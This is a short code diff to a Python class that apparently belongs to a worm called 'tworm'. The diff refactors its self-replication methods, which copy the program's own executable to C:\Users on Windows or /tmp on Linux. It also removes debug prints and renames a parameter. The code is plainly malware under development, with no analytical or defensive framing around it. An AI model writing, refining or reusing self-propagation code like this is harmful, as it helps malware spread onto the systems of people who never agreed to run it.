@@ -15,7 +15,6 @@ class replicate:
         return self.data
     
     def self_replicate(self, target="windows", source_path="tworm.exe", dest_path=""):
-        print("start")
         try:
             if "windows" in target.lower():
                 self.replicate_on_windows(source_path, dest_path)
@@ -26,14 +25,12 @@ class replicate:
         except Exception as e:
             print("replicate error: {}".format(e))
             
-    def replicate_on_windows(self, source="tworm.exe", path_name="C:\\Users\\tworm.exe"):
+    def replicate_on_windows(self, source="tworm.exe", dest_path="C:\\Users\\tworm.exe"):
         with open(source, 'rb') as file:
-            with open(path_name, 'wb') as clone:
+            with open(dest_path, 'wb') as clone:
                 clone.write(file.read())
-        print("finished")
     
-    def replicate_on_linux(self, source="tworm.elf", path_name="/tmp/tworm.elf"):
+    def replicate_on_linux(self, source="tworm.elf", dest_path="/tmp/tworm.elf"):
         with open(source, 'rb') as file:
-                with open(path_name, 'wb') as clone:
+                with open(dest_path, 'wb') as clone:
                     clone.write(file.read())
-        print("finished")
